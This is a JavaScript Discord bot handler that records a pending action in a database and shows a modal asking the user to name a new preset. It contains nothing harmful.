const generate = require("../../../autosecure/utils/utils/generate")
const { queryParams } = require("../../../db/database")
const modalBuilder = require("../../../autosecure/utils/modalBuilder")
const { TextInputStyle } = require("discord.js")

module.exports = {
  name: "createpreset1",
  callback: async (client, interaction) => {
    let [t, userid, botnumber] = interaction.customId.split("|")
    let rId = generate(32)
    let presets = await queryParams(`SELECT * FROM presets WHERE user_id=? AND botnumber=?`, [userid, botnumber])
    let presetcount = presets.length

    await queryParams(
      `INSERT INTO actions (id, action) VALUES (?, ?)`,
      [rId, `createpresetmodal|${userid}|${botnumber}|${presetcount}`]
    )

    await interaction.showModal(
      modalBuilder(`action|${rId}`, 'Create Preset', [
        {
          setCustomId: 'presetname',
          setMaxLength: 21,
          setMinLength: 1,
          setRequired: true,
          setLabel: "Name of preset",
          setPlaceholder: "Ex: oauth",
          setStyle: TextInputStyle.Short
        }
      ])
    )
  }
}
